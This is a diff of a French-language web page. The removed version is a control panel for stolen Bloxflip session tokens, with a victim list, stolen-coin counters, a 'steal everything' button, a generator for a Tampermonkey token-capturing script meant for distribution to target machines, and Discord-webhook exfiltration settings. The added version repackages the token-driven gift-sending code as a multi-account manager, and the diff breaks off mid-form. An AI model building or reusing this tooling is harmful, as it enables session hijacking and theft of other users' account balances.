@@ -3,937 +3,429 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bloxflip Controller • V4</title>
+    <title>Bloxflip Multi-Comptes</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: 'Segoe UI', sans-serif;
-            background: #0f0f1a;
-            color: #e0e0e0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px 20px;
-            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh; color: #fff; padding: 20px;
         }
-        .container { max-width: 960px; width: 100%; }
-        
-        .stats-bar { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
-        .stat-card {
-            background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 10px;
-            padding: 14px 18px; flex: 1; min-width: 110px; text-align: center;
+        .container { max-width: 860px; margin: 0 auto; }
+
+        /* Onglets */
+        .tabs {
+            display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap;
         }
-        .stat-number { font-size: 26px; font-weight: 700; color: #7cff7c; font-family: monospace; }
-        .stat-label { font-size: 10px; color: #8888aa; text-transform: uppercase; margin-top: 3px; }
-        
-        .panel {
-            background: #1a1a2e; border: 1px solid #2a2a4a;
-            border-radius: 12px; padding: 25px; margin-bottom: 20px;
+        .tab {
+            padding: 10px 18px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(255,255,255,0.05); color: #888; cursor: pointer;
+            font-size: 13px; transition: 0.2s; user-select: none;
         }
-        .panel-title { color: #f7c948; font-size: 17px; font-weight: 600; margin-bottom: 14px; }
-        
-        .victim-card {
-            background: #0f0f1a; border: 1px solid #2a2a4a;
-            border-radius: 8px; padding: 14px; margin-bottom: 8px;
-            display: flex; justify-content: space-between; align-items: center;
-            flex-wrap: wrap; gap: 10px;
+        .tab:hover { background: rgba(255,255,255,0.1); }
+        .tab.active { background: rgba(108,99,255,0.3); border-color: #6c63ff; color: #fff; }
+        .tab .badge {
+            display: inline-block; margin-left: 6px; font-size: 11px;
+            background: rgba(255,255,255,0.1); padding: 1px 7px; border-radius: 10px;
         }
-        .victim-card:hover { border-color: #ff6b35; }
-        .victim-info { flex: 1; min-width: 200px; }
-        .victim-name { color: #f7c948; font-weight: 600; font-size: 14px; }
-        .victim-meta { font-size: 10px; color: #666; margin-top: 3px; }
-        .victim-token-display { font-size: 11px; color: #888; margin-top: 3px; word-break: break-all; }
-        .victim-token-display code { color: #7cff7c; background: #0a0a1a; padding: 1px 5px; border-radius: 3px; font-size: 10px; }
-        .victim-actions { display: flex; gap: 5px; flex-wrap: wrap; }
-        
-        .badge {
-            display: inline-block; padding: 2px 8px; border-radius: 10px;
-            font-size: 10px; font-weight: 600; margin-left: 6px;
+        .add-tab {
+            padding: 10px 14px; border-radius: 10px; border: 1px dashed rgba(255,255,255,0.2);
+            background: transparent; color: #6c63ff; cursor: pointer; font-size: 20px; line-height: 1;
+            transition: 0.2s;
         }
-        .badge-valid { background: #0a2a0a; color: #7cff7c; border: 1px solid #2a5a2a; }
-        .badge-invalid { background: #2a0a0a; color: #ff6b6b; border: 1px solid #5a2a2a; }
-        .badge-unknown { background: #1a1a0a; color: #f7c948; border: 1px solid #4a4a1a; }
-        
-        .btn {
-            padding: 7px 14px; border: none; border-radius: 6px;
-            font-weight: 600; font-size: 11px; cursor: pointer;
-            color: white; transition: opacity 0.2s;
+        .add-tab:hover { background: rgba(108,99,255,0.1); border-color: #6c63ff; }
+
+        /* Panneaux */
+        .panel { display: none; }
+        .panel.active { display: block; }
+
+        .card {
+            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 14px; padding: 20px; margin-bottom: 16px;
         }
-        .btn:hover { opacity: 0.85; }
-        .btn-orange { background: linear-gradient(135deg,#ff6b35,#e85d30); }
-        .btn-red { background: linear-gradient(135deg,#e74c3c,#c0392b); }
-        .btn-gray { background: #2a2a4a; color: #ccc; }
-        .btn-green { background: linear-gradient(135deg,#27ae60,#1e8449); }
-        .btn-blue { background: linear-gradient(135deg,#2980b9,#1a5276); }
-        .btn-small { padding: 4px 10px; font-size: 10px; }
-        
-        .input-group { margin: 7px 0; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
-        .input-group label { color: #8888aa; font-size: 11px; min-width: 80px; }
-        input, select {
-            background: #0f0f1a; border: 1px solid #2a2a4a; border-radius: 6px;
-            padding: 7px 10px; color: #e0e0e0; font-size: 12px; outline: none;
-            flex: 1; min-width: 100px;
+        .card h2 { font-size: 16px; margin-bottom: 12px; }
+
+        .token-inputs { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
+        .token-inputs .full { grid-column: 1 / -1; }
+        .token-inputs label { display: block; font-size: 11px; color: #888; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .token-inputs input {
+            width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(0,0,0,0.3); color: #fff; font-size: 13px; font-family: monospace;
+            outline: none; transition: border 0.2s;
         }
-        input:focus, select:focus { border-color: #ff6b35; }
-        
+        .token-inputs input:focus { border-color: #6c63ff; }
+        .token-inputs input.saved { border-color: #10b981; }
+
+        .btn-connect {
+            padding: 10px 20px; border: none; border-radius: 8px;
+            background: linear-gradient(135deg, #6c63ff, #e040fb);
+            color: #fff; font-weight: 600; cursor: pointer; font-size: 13px; transition: 0.2s;
+        }
+        .btn-connect:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(108,99,255,0.4); }
+        .btn-connect:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        .btn-danger {
+            padding: 8px 14px; border: 1px solid rgba(255,107,107,0.3); border-radius: 8px;
+            background: rgba(255,107,107,0.1); color: #ff6b6b; cursor: pointer; font-size: 12px; transition: 0.2s;
+        }
+        .btn-danger:hover { background: rgba(255,107,107,0.2); }
+
+        .balances {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 10px; margin-bottom: 12px;
+        }
+        .balance-item {
+            background: rgba(255,255,255,0.03); border-radius: 10px; padding: 14px; text-align: center;
+        }
+        .balance-item .label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }
+        .balance-item .value { font-size: 20px; font-weight: 700; margin-top: 4px; }
+        .balance-item .value.rocoins { color: #f59e0b; }
+        .balance-item .value.flipcoins { color: #10b981; }
+        .balance-item .value.coins { color: #3b82f6; }
+        .balance-item .value.xp { color: #8b5cf6; }
+        .balance-item .value.keys { color: #ef4444; }
+
+        .tip-form { display: flex; gap: 10px; flex-wrap: wrap; align-items: end; }
+        .tip-form .field { flex: 1; min-width: 120px; }
+        .tip-form .field label { display: block; font-size: 11px; color: #888; margin-bottom: 3px; }
+        .tip-form .field input, .tip-form .field select {
+            width: 100%; padding: 8px 10px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(0,0,0,0.3); color: #fff; font-size: 13px; outline: none;
+        }
+        .tip-form .field select option { background: #1a1a2e; }
+        .btn-tip {
+            padding: 8px 18px; border: none; border-radius: 6px;
+            background: linear-gradient(135deg, #6c63ff, #e040fb);
+            color: #fff; font-weight: 600; cursor: pointer; font-size: 13px; transition: 0.2s;
+        }
+        .btn-tip:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(108,99,255,0.4); }
+        .btn-tip:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
         .result-box {
             margin-top: 10px; padding: 10px; border-radius: 6px;
-            font-size: 12px; display: none; line-height: 1.5;
+            background: rgba(0,0,0,0.3); font-family: monospace; font-size: 12px;
+            white-space: pre-wrap; word-break: break-all; display: none;
         }
-        .result-box.success { display: block; background: #0a2a0a; border: 1px solid #2a5a2a; color: #7cff7c; }
-        .result-box.error { display: block; background: #2a0a0a; border: 1px solid #5a2a2a; color: #ff6b6b; }
-        .result-box.info { display: block; background: #0a1a2a; border: 1px solid #2a4a5a; color: #88aaff; }
-        .result-box.warning { display: block; background: #2a2a0a; border: 1px solid #5a5a2a; color: #ffff7c; }
+        .result-box.success { border-left: 3px solid #10b981; display: block; }
+        .result-box.error { border-left: 3px solid #ef4444; display: block; }
 
-        .log-box {
-            background: #0f0f1a; border: 1px solid #2a2a4a;
-            border-radius: 8px; padding: 12px; max-height: 180px;
-            overflow-y: auto; font-family: monospace; font-size: 10px;
+        .loading-msg { text-align: center; padding: 20px; color: #666; font-size: 14px; }
+        .account-header {
+            display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;
         }
-        .log-box div { padding: 2px 0; border-bottom: 1px solid #1a1a2e; }
-        .log-success { color: #7cff7c; }
-        .log-error { color: #ff6b6b; }
-        .log-info { color: #88aaff; }
-
-        .tab-bar { display: flex; gap: 2px; margin-bottom: 0; }
-        .tab {
-            padding: 9px 18px; background: #1a1a2e; border: 1px solid #2a2a4a;
-            border-bottom: none; border-radius: 8px 8px 0 0; cursor: pointer;
-            font-size: 12px; color: #8888aa;
-        }
-        .tab.active { background: #0f0f1a; color: #f7c948; border-color: #ff6b35; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        .footer { text-align: center; color: #555577; font-size: 11px; margin-top: 20px; }
-        .empty-state { color: #555; font-style: italic; text-align: center; padding: 25px; font-size: 13px; }
+        .account-header .name { font-weight: 600; font-size: 15px; }
         .status-dot {
-            display: inline-block; width: 8px; height: 8px;
-            border-radius: 50%; margin-right: 5px;
+            display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px;
         }
-        .status-dot.online { background: #7cff7c; }
-        .status-dot.offline { background: #ff6b6b; }
-        
-        pre {
-            background: #0f0f1a; padding: 12px; border-radius: 6px;
-            border: 1px solid #2a2a4a; font-size: 10px;
-            white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto;
+        .status-dot.online { background: #10b981; }
+        .status-dot.offline { background: #ef4444; }
+
+        @media (max-width: 600px) {
+            .token-inputs { grid-template-columns: 1fr; }
+            .tip-form { flex-direction: column; }
+            .tip-form .field { min-width: 100%; }
         }
-        .info-banner {
-            background: #0a1a2a; border: 1px solid #2a4a5a; border-radius: 8px;
-            padding: 10px 14px; margin-bottom: 14px; font-size: 12px; color: #88aaff; line-height: 1.5;
-        }
-        .info-banner strong { color: #f7c948; }
-        .key-badge {
-            display: inline-block; background: #0a0a1a; color: #ff6b35;
-            padding: 2px 8px; border-radius: 4px; font-family: monospace;
-            font-size: 11px; border: 1px solid #ff6b3544;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
-        .loading { animation: pulse 1.2s infinite; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 style="background:linear-gradient(135deg,#ff6b35,#f7c948);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:26px;margin-bottom:3px;">🎯 Bloxflip Controller <span style="font-size:12px;color:#8888aa;-webkit-text-fill-color:#8888aa;">v4</span></h1>
-        <p style="color:#8888aa;margin-bottom:18px;font-size:13px;">
-            Token : <span class="key-badge">cw:pubsubToken</span> → <span class="key-badge">X-Auth-Token</span>
-        </p>
+        <h1 style="margin-bottom: 20px; font-size: 20px;">🎮 Bloxflip Multi-Comptes</h1>
 
-        <!-- Stats -->
-        <div class="stats-bar" id="statsBar">
-            <div class="stat-card">
-                <div class="stat-number" id="statVictims">0</div>
-                <div class="stat-label">Victimes</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="statValid">0</div>
-                <div class="stat-label">Tokens valides</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="statRocoins" style="color:#f7c948;">0</div>
-                <div class="stat-label">Volés (ROCOINS)</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="statFlipcoins" style="color:#f7c948;">0</div>
-                <div class="stat-label">Volés (FLIPCOINS)</div>
-            </div>
-        </div>
+        <div class="tabs" id="tabs"></div>
 
-        <!-- Onglets -->
-        <div class="tab-bar">
-            <div class="tab active" onclick="switchTab('victims')">👥 Victimes</div>
-            <div class="tab" onclick="switchTab('actions')">🎮 Actions</div>
-            <div class="tab" onclick="switchTab('config')">⚙️ Config</div>
-            <div class="tab" onclick="switchTab('logs')">📜 Logs</div>
-        </div>
-
-        <!-- Tab: Victimes -->
-        <div id="tab-victims" class="panel tab-content active" style="border-radius:0 12px 12px 12px;margin-top:0;">
-            <div class="panel-title">👥 Tokens enregistrés</div>
-            <div id="victimsContainer">
-                <div class="empty-state">
-                    🔴 Aucun token enregistré.<br><br>
-                    📌 <strong>Ajout manuel</strong> : colle le token <code style="color:#ff6b35;">cw:pubsubToken</code><br>
-                    📌 <strong>Via script</strong> : installe le script Tampermonkey sur la machine cible<br><br>
-                    <button class="btn btn-orange btn-small" onclick="switchTab('config')">⚙️ Aller dans Config</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Tab: Actions -->
-        <div id="tab-actions" class="panel tab-content" style="border-radius:0 12px 12px 12px;margin-top:0;">
-            <div class="panel-title">🎮 Actions</div>
-            
-            <div class="info-banner">
-                <strong>⚠️ Condition requise :</strong> Le token doit être <strong>valide</strong> (non expiré).
-                Utilise <strong>🔍 Tester</strong> pour vérifier. Le token <code>cw:pubsubToken</code> 
-                valide permet d'appeler l'API sans que la victime soit connectée au moment de l'action.
-                <br><br>
-                <strong>📅 Expiration :</strong> Le token <code>cw:pubsubToken</code> semble avoir une durée de vie longue.
-            </div>
-
-            <div style="margin-bottom:14px;">
-                <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:5px;">1. Choisir un token</div>
-                <select id="actionVictim" style="width:100%;">
-                    <option value="">— Aucun token disponible —</option>
-                </select>
-                <div style="display:flex;gap:5px;margin-top:5px;">
-                    <button class="btn btn-gray btn-small" onclick="testVictimToken()">🔍 Tester la validité</button>
-                    <button class="btn btn-blue btn-small" onclick="refreshVictimInfo()">🔄 Rafraîchir infos</button>
-                </div>
-            </div>
-
-            <div style="margin-bottom:14px;">
-                <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:5px;">2. Configurer le vol</div>
-                <div class="input-group">
-                    <label>Destinataire</label>
-                    <input type="text" id="actionRecipient" placeholder="Ton pseudo Bloxflip">
-                </div>
-                <div class="input-group">
-                    <label>Devise</label>
-                    <select id="actionCurrency">
-                        <option value="ROCOINS">ROCOINS</option>
-                        <option value="FLIPCOINS">FLIPCOINS</option>
-                        <option value="COINS">COINS</option>
-                    </select>
-                </div>
-            </div>
-
-            <div style="display:flex;gap:6px;flex-wrap:wrap;">
-                <button class="btn btn-green" onclick="executeAction('balance')">💰 Voir le solde</button>
-                <button class="btn btn-orange" onclick="executeAction('tip')">🎁 Tip personnalisé</button>
-                <button class="btn btn-red" onclick="executeAction('steal')">🔥 Tout voler</button>
-            </div>
-
-            <div id="actionResult" class="result-box"></div>
-        </div>
-
-        <!-- Tab: Config -->
-        <div id="tab-config" class="panel tab-content" style="border-radius:0 12px 12px 12px;margin-top:0;">
-            <div class="panel-title">⚙️ Configuration</div>
-            
-            <div class="info-banner">
-                <strong>🔒 Sécurité :</strong> Tous les tokens sont stockés dans ton navigateur (localStorage).
-                Rien n'est envoyé automatiquement à un serveur ou Discord.
-                <br><br>
-                <strong>🔑 Token Bloxflip :</strong> Le vrai token est stocké dans <code>localStorage.getItem('cw:pubsubToken')</code>
-            </div>
-
-            <div style="margin-bottom:15px;">
-                <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:6px;">🌐 URL de réception (optionnel)</div>
-                <input type="url" id="siteUrl" placeholder="https://ton-site.com/api/collect (laisse vide si inutilisé)" value="">
-            </div>
-
-            <div style="margin-bottom:15px;">
-                <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:6px;">🔗 Webhook Discord (optionnel)</div>
-                <div style="display:flex;gap:8px;">
-                    <input type="url" id="discordWebhook" placeholder="Laisse VIDE si tu ne veux pas d'envoi" value="">
-                    <button class="btn btn-gray" onclick="saveConfig()">💾 Sauver</button>
-                </div>
-                <p style="font-size:10px;color:#ff6b6b;margin-top:4px;">⚠️ Ne remplis QUE si tu veux exfiltrer les tokens vers Discord.</p>
-            </div>
-
-            <div style="margin-bottom:15px;">
-                <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:6px;">📋 Script Tampermonkey à distribuer</div>
-                <p style="font-size:12px;color:#b0b0cc;margin-bottom:6px;">
-                    Le script capture le token <code style="color:#ff6b35;">cw:pubsubToken</code> 
-                    (le vrai token Bloxflip) et l'envoie ici.
-                </p>
-                <button class="btn btn-orange btn-small" onclick="generateScript()">⚡ Générer le script</button>
-                <div id="scriptOutput" style="display:none;margin-top:10px;">
-                    <pre id="scriptCode"></pre>
-                    <button class="btn btn-green btn-small" onclick="copyScript()">📋 Copier</button>
-                </div>
-            </div>
-
-            <div style="margin-bottom:15px;">
-                <div style="color:#8888aa;font-size:11px;text-transform:uppercase;margin-bottom:6px;">➕ Ajout manuel d'un token</div>
-                <p style="font-size:12px;color:#b0b0cc;margin-bottom:6px;">
-                    Colle directement le token <code style="color:#ff6b35;">cw:pubsubToken</code> 
-                    que tu as récupéré :
-                </p>
-                <div style="display:flex;gap:8px;">
-                    <input type="text" id="manualToken" placeholder="cw:pubsubToken" style="flex:1;font-family:monospace;font-size:11px;">
-                    <input type="text" id="manualName" placeholder="Pseudo (opt.)" style="width:150px;">
-                    <button class="btn btn-green btn-small" onclick="addManual()">➕ Ajouter</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Tab: Logs -->
-        <div id="tab-logs" class="panel tab-content" style="border-radius:0 12px 12px 12px;margin-top:0;">
-            <div class="panel-title">📜 Logs</div>
-            <div id="logBox" class="log-box">
-                <div class="log-info">🟢 Initialisation...</div>
-            </div>
-        </div>
-
-        <div class="footer">HackerAI — Test d'intrusion autorisé</div>
+        <div id="panels"></div>
     </div>
 
     <script>
-        // ============================================
-        // STOCKAGE
-        // ============================================
-        let victims = JSON.parse(localStorage.getItem('bf_victims') || '[]');
-        let stats = JSON.parse(localStorage.getItem('bf_stats') || '{"valid":0,"rocoins":0,"flipcoins":0}');
-        let config = JSON.parse(localStorage.getItem('bf_config') || '{}');
-
-        // ============================================
-        // LOGS
-        // ============================================
-        function log(msg, type = 'info') {
-            const box = document.getElementById('logBox');
-            const div = document.createElement('div');
-            div.className = 'log-' + type;
-            const now = new Date();
-            const ts = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
-            div.textContent = `[${ts}] ${msg}`;
-            box.appendChild(div);
-            box.scrollTop = box.scrollHeight;
+        // === STOCKAGE ===
+        function getAccounts() {
+            try { return JSON.parse(localStorage.getItem('bf_accounts')) || []; }
+            catch { return []; }
+        }
+        function saveAccounts(accounts) {
+            localStorage.setItem('bf_accounts', JSON.stringify(accounts));
         }
 
-        // ============================================
-        // STATS
-        // ============================================
-        function updateStats() {
-            document.getElementById('statVictims').textContent = victims.length;
-            document.getElementById('statValid').textContent = victims.filter(v => v.valid === true).length;
-            document.getElementById('statRocoins').textContent = (stats.rocoins || 0).toLocaleString();
-            document.getElementById('statFlipcoins').textContent = (stats.flipcoins || 0).toLocaleString();
-        }
+        let accounts = getAccounts();
+        let activeIndex = -1;
+        let balancesCache = {};
 
-        // ============================================
-        // API BLOXFLIP — HEADERS CORRECTS
-        // ============================================
-        function getHeaders(token) {
+        // === FONCTIONS API ===
+        async function getBalance(rt) {
+            const res = await fetch('https://bloxflip.com/api/user', {
+                credentials: 'include',
+                headers: { 'Accept': 'application/json', 'x-auth-token': rt }
+            });
+            if (!res.ok) throw new Error(`API ${res.status}`);
+            const data = await res.json();
             return {
-                'Accept': 'application/json, text/plain, */*',
-                'X-Auth-Token': token,
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Referer': 'https://bloxflip.com/',
-                'Origin': 'https://bloxflip.com'
+                rocoins: data.wallet?.balances?.ROCOINS ?? 0,
+                flipcoins: data.wallet?.balances?.FLIPCOINS ?? 0,
+                coins: data.wallet?.balances?.COINS ?? 0,
+                xp: data.wallet?.balances?.XP ?? 0,
+                keys: data.wallet?.balances?.KEYS ?? 0
             };
         }
 
-        // ============================================
-        // TESTER UN TOKEN VIA L'API
-        // ============================================
-        async function testTokenApi(token) {
-            try {
-                const res = await fetch('https://bloxflip.com/api/user', {
-                    headers: getHeaders(token)
-                });
-                
-                if (res.status === 401 || res.status === 403) {
-                    return { valid: false, error: 'Token invalide/expiré (HTTP ' + res.status + ')' };
-                }
-                if (!res.ok) {
-                    return { valid: false, error: 'Erreur HTTP ' + res.status };
-                }
-                
-                const data = await res.json();
-                
-                // Structure réelle de Bloxflip: data.profile.username, data.wallet.balances
-                if (data && data.profile && data.profile.username) {
-                    return { 
-                        valid: true, 
-                        username: data.profile.username,
-                        userId: data.profile.id,
-                        rank: data.profile.rank,
-                        rocoins: data.wallet?.balances?.ROCOINS || 0,
-                        flipcoins: data.wallet?.balances?.FLIPCOINS || 0,
-                        coins: data.wallet?.balances?.COINS || 0,
-                        tokens: data.tokens,
-                        data: data
-                    };
-                }
-                return { valid: false, error: 'Réponse API inattendue' };
-            } catch (err) {
-                return { valid: false, error: err.message };
-            }
+        async function sendTip(rt, recipient, amount, currency) {
+            const res = await fetch('https://bloxflip.com/api/chat/commands/gift', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'x-currency': currency,
+                    'x-auth-token': rt
+                },
+                body: JSON.stringify({
+                    recipientUsername: recipient,
+                    amount: parseFloat(amount),
+                    captcha_token: ""
+                })
+            });
+            return await res.json();
         }
 
-        // ============================================
-        // TESTER LE TOKEN (bouton)
-        // ============================================
-        async function testVictimToken() {
-            const idx = document.getElementById('actionVictim').value;
-            if (!idx) { log('❌ Choisis d\'abord un token', 'error'); return; }
-            await testVictimTokenIndex(parseInt(idx));
-        }
+        // === RENDU ===
+        function render() {
+            const tabsContainer = document.getElementById('tabs');
+            const panelsContainer = document.getElementById('panels');
 
-        async function testVictimTokenIndex(index) {
-            const v = victims[index];
-            if (!v || !v.token) {
-                log('❌ Pas de token pour cette entrée', 'error');
+            if (accounts.length === 0) {
+                tabsContainer.innerHTML = '';
+                panelsContainer.innerHTML = `
+                    <div class="card" style="text-align:center; padding:40px;">
+                        <p style="color:#666; margin-bottom:16px;">Aucun compte ajouté.</p>
+                        <p style="color:#888; font-size:13px;">Clique sur <strong>+</strong> pour ajouter un compte.</p>
+                    </div>
+                `;
+                // créer un premier compte automatiquement
+                addAccount();
                 return;
             }
 
-            log(`🔍 Test du token ${v.token.substring(0,16)}... pour ${v.username || '?'}`, 'info');
-            
-            const result = await testTokenApi(v.token);
-            
-            if (result.valid) {
-                v.valid = true;
-                v.username = result.username;
-                v.userId = result.userId;
-                v.rank = result.rank;
-                v.rocoins = result.rocoins;
-                v.flipcoins = result.flipcoins;
-                v.coins = result.coins;
-                v.lastTest = Date.now();
-                localStorage.setItem('bf_victims', JSON.stringify(victims));
-                renderVictims();
-                updateStats();
-                log(`✅ Token VALIDE — ${result.username} (Rank ${result.rank}) | ROCOINS: ${result.rocoins} | FLIPCOINS: ${result.flipcoins}`, 'success');
-            } else {
-                v.valid = false;
-                v.lastTest = Date.now();
-                localStorage.setItem('bf_victims', JSON.stringify(victims));
-                renderVictims();
-                log(`❌ Token INVALIDE — ${result.error}`, 'error');
-            }
-        }
+            if (activeIndex < 0 || activeIndex >= accounts.length) activeIndex = 0;
 
-        // ============================================
-        // RAFRAÎCHIR LES INFOS
-        // ============================================
-        async function refreshVictimInfo() {
-            const idx = document.getElementById('actionVictim').value;
-            if (!idx) { log('❌ Choisis d\'abord un token', 'error'); return; }
-            
-            const v = victims[parseInt(idx)];
-            if (!v || !v.token) return;
-            
-            log(`🔄 Rafraîchissement des infos de ${v.username || '?'}...`, 'info');
-            
-            await testVictimTokenIndex(parseInt(idx));
-            
-            const updatedVictim = victims[parseInt(idx)];
-            if (updatedVictim && updatedVictim.valid) {
-                const resultBox = document.getElementById('actionResult');
-                resultBox.className = 'result-box success';
-                resultBox.innerHTML = `✅ ${updatedVictim.username} (Rank ${updatedVictim.rank})<br>ROCOINS: ${(updatedVictim.rocoins || 0).toLocaleString()}<br>FLIPCOINS: ${(updatedVictim.flipcoins || 0).toLocaleString()}<br>COINS: ${(updatedVictim.coins || 0).toLocaleString()}`;
-                resultBox.style.display = 'block';
-            }
-        }
+            // Onglets
+            tabsContainer.innerHTML = accounts.map((acc, i) => {
+                const isActive = i === activeIndex;
+                const name = acc.name || `Compte ${i + 1}`;
+                return `<div class="tab ${isActive ? 'active' : ''}" onclick="switchAccount(${i})">
+                    ${name}${acc.connected ? ' ✅' : ''}
+                    <span class="badge">${i + 1}</span>
+                </div>`;
+            }).join('') + `<div class="add-tab" onclick="addAccount()" title="Ajouter un compte">+</div>`;
 
-        // ============================================
-        // AFFICHAGE DES VICTIMES
-        // ============================================
-        function renderVictims() {
-            const container = document.getElementById('victimsContainer');
-            const select = document.getElementById('actionVictim');
-            
-            if (victims.length === 0) {
-                container.innerHTML = '<div class="empty-state">🔴 Aucun token enregistré.</div>';
-                select.innerHTML = '<option value="">— Aucun token disponible —</option>';
-                return;
-            }
-
-            container.innerHTML = victims.map((v, i) => {
-                let statusClass = 'offline';
-                let statusLabel = 'Non testé';
-                if (v.valid === true) { statusClass = 'online'; statusLabel = 'Valide'; }
-                else if (v.valid === false) { statusClass = 'offline'; statusLabel = 'Invalide'; }
-                
-                const badge = v.valid === true ? '<span class="badge badge-valid">✅ Valide</span>' 
-                            : v.valid === false ? '<span class="badge badge-invalid">❌ Invalide</span>' 
-                            : '<span class="badge badge-unknown">⏳ Non testé</span>';
-
-                const roc = v.rocoins !== undefined ? `ROCOINS: ${v.rocoins.toLocaleString()}` : '';
-                const flc = v.flipcoins !== undefined ? `FLIPCOINS: ${v.flipcoins.toLocaleString()}` : '';
-                const rank = v.rank ? `Rank ${v.rank}` : '';
-                const balances = [rank, roc, flc].filter(Boolean).join(' | ');
+            // Panneaux
+            panelsContainer.innerHTML = accounts.map((acc, i) => {
+                const isActive = i === activeIndex;
+                const bal = balancesCache[i] || null;
+                const loading = acc.loading || false;
+                const name = acc.name || `Compte ${i + 1}`;
 
                 return `
-                <div class="victim-card">
-                    <div class="victim-info">
-                        <div class="victim-name">
-                            <span class="status-dot ${statusClass}"></span>
-                            ${v.username || 'Inconnu'} ${badge}
+                <div class="panel ${isActive ? 'active' : ''}" data-index="${i}">
+                    <div class="card">
+                        <div class="account-header">
+                            <div>
+                                <span class="status-dot ${acc.connected ? 'online' : 'offline'}"></span>
+                                <span class="name">${acc.connected ? '✅ Connecté' : '🔌 Non connecté'}</span>
+                            </div>
+                            <button class="btn-danger" onclick="removeAccount(${i})">🗑 Supprimer</button>
                         </div>
-                        <div class="victim-meta">${new Date(v.time).toLocaleString()} ${balances ? '| ' + balances : ''}</div>
-                        <div class="victim-token-display">
-                            Token: <code>${v.token ? v.token.substring(0, 38) + '...' : '❌'}</code>
+
+                        <div class="token-inputs">
+                            <div>
+                                <label>Token app.rt</label>
+                                <input type="password" id="rt_${i}" value="${acc.rt || ''}" placeholder="..." class="${acc.rt ? 'saved' : ''}">
+                            </div>
+                            <div>
+                                <label>Token app.at</label>
+                                <input type="password" id="at_${i}" value="${acc.at || ''}" placeholder="..." class="${acc.at ? 'saved' : ''}">
+                            </div>
+                            <div class="full" style="display:flex; gap:8px; align-items:end;">
+                                <div style="flex:2;">
+                                    <label>Surnom (optionnel)</label>
+                                    <input type="text" id="nick_${i}" value="${acc.name || ''}" placeholder="Mon compte principal" style="font-family:inherit;">
+                                </div>
+                                <button class="btn-connect" onclick="connectAccount(${i})" id="connectBtn_${i}">
+                                    ${acc.connected ? '🔄 Reconnecter' : '🔗 Se connecter'}
+                                </button>
+                            </div>
                         </div>
                     </div>
-                    <div class="victim-actions">
-                        <button class="btn btn-green btn-small" onclick="copyToken(${i})">📋 Copier</button>
-                        <button class="btn btn-blue btn-small" onclick="testVictimTokenIndex(${i})">🔍 Tester</button>
-                        <button class="btn btn-red btn-small" onclick="deleteVictim(${i})">🗑️</button>
+
+                    <div id="balances_${i}">
+                        ${loading ? '<div class="loading-msg">⏳ Chargement...</div>' : ''}
+                        ${bal && !loading ? `
+                        <div class="card">
+                            <h2>💰 Soldes</h2>
+                            <div class="balances">
+                                <div class="balance-item"><div class="label">ROCOINS</div><div class="value rocoins">${Number(bal.rocoins).toLocaleString()}</div></div>
+                                <div class="balance-item"><div class="label">FLIPCOINS</div><div class="value flipcoins">${Number(bal.flipcoins).toLocaleString()}</div></div>
+                                <div class="balance-item"><div class="label">COINS</div><div class="value coins">${Number(bal.coins).toLocaleString()}</div></div>
+                                <div class="balance-item"><div class="label">XP</div><div class="value xp">${Number(bal.xp).toLocaleString()}</div></div>
+                                <div class="balance-item"><div class="label">KEYS</div><div class="value keys">${Number(bal.keys).toLocaleString()}</div></div>
+                            </div>
+                        </div>
+                        ` : ''}
+                        ${!acc.connected && !loading ? '<div class="card" style="text-align:center;color:#666;padding:20px;">Connecte le compte pour voir les soldes.</div>' : ''}
                     </div>
+
+                    ${acc.connected ? `
+                    <div class="card">
+                        <h2>💸 Envoyer un Tip</h2>
+                        <div class="tip-form">
